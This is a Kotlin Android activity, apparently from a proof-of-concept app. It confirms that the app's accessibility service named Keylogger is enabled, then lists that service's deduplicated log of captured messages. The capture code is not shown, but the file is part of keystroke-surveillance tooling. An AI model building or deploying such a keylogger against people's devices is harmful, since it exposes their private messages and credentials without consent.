package com.synergia.datapoc

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import androidx.recyclerview.widget.LinearLayoutManager
import kotlinx.android.synthetic.main.activity_main.*



class SendDetailsActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_send_details)
        if(isAccessibilityServiceEnabled(this, Keylogger::class.java)){
            AppDatabase.getDatabase(this)!!.msgDao().getSendLog().observe(this, Observer { it ->
                if (it.isNotEmpty()) {
                    val data=it as ArrayList<SendLog>
                    val filteredData=ArrayList<SendLog>()

                    for(i in data.indices){
                        if(i>0){
                            if(!data[i].msg.contains(data[i-1].msg,true)){
                                filteredData.add(data[i-1])
                            }
                        }
                    }
                    filteredData.add(data.last())
                    val  finalData=filteredData.distinctBy { Pair(it.msg, it.date) }
                    msg_log_recycler_view.layoutManager = LinearLayoutManager(this)
                    msg_log_recycler_view.setHasFixedSize(true)
                    msg_log_recycler_view.adapter = SendLogAdapter(finalData as ArrayList<SendLog>)
                }
            })
        }else{

            /*AlertDialogHelper.showDialog(
                this,
                "Enable Accessibility",
                "Need Accessibility permission",
                "Ok",
                null,
                DialogInterface.OnClickListener { dialog, _ ->
                    //service is not enabled try to enabled by calling...
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivityForResult(intent, 0)
                    dialog.cancel()
                    this.finish()
                }
            )*/

        }
    }

    fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService?>): Boolean {
        val am =
            context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices =
            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (enabledService in enabledServices) {
            val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
            if (enabledServiceInfo.packageName == context.packageName && enabledServiceInfo.name == service.name) return true
        }
        return false
    }

}